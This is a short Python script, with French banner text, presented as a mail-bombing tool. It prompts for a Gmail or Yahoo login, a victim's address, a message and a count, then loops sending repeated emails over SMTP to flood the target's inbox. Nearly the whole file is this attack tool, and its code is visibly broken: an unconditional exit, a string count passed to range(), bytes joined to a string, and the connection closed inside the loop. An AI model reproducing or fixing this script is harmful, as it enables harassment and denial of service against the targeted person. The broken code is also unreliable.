#!/usr/bin/python
# -*- coding: latin-1 -*-
import sys
import os
import smtplib
import getpass

def mail_bombing():
    print("#-----------------------------------------------------------#")
    print("- ____ ___ __ __ ____ _ ___ _ _ _ __ -")
    print("- | __ ) / _ \| \/ | __ )| | |_ _| \ | | |/ / -")
    print("- | _ \| | | | |\/| | _ \| | | || \| | ' / -")
    print( "- | |_) | |_| | | | | |_) | |___ | || |\ | . \ -")
    print( "- |____/ \___/|_| |_|____/|_____|___|_| \_|_|\_\ -")
    print( "- ************************ -")
    print( "#-----------------------------------------------------------#")
    print( "- Exemple: -")
    print( "- Server Mail: Gmail ou Yahoo -")
    print( "- Id et Password -")
    print( "- email de la victime -")
    print( "- Text -")
    print( "- Mombres de Message envoyer -")
    print( "#-----------------------------------------------------------#")





    server = input('Server Mail: ')
    user = input('Username: ')
    passwd = input('Password: ')


    to = input('\nTo: ')
    #subject = raw_input('Subject: ')
    body = input('Message: ')
    total = input('Number of send: ')

    if server == 'gmail':
        smtp_server = 'smtp.gmail.com'
        port = 587
    elif server == 'yahoo':
        smtp_server = 'smtp.mail.yahoo.com'
        port = 25
    else:
        print ('Applies only to gmail and yahoo.')
    sys.exit()

    print ('')

    try:
        server = smtplib.SMTP(smtp_server,port)
        server.ehlo()
        if smtp_server == "smtp.gmail.com":
            server.starttls()
            server.login(user,passwd)
            print("ca va commencer a envoyer la mais bon")
            for i in range(1, total+1):
                subject = os.urandom(9)
                msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
                server.sendmail(user,to,msg)
                print ("\rTotal emails sent: %i" % i)
                sys.stdout.flush()
                server.quit()
        print ('\n Done !!!')
        return
    except KeyboardInterrupt:
        print ('[-] Canceled')
        return
    except smtplib.SMTPAuthenticationError:
        print ('\n[!] The username or password you entered is incorrect.')
        return


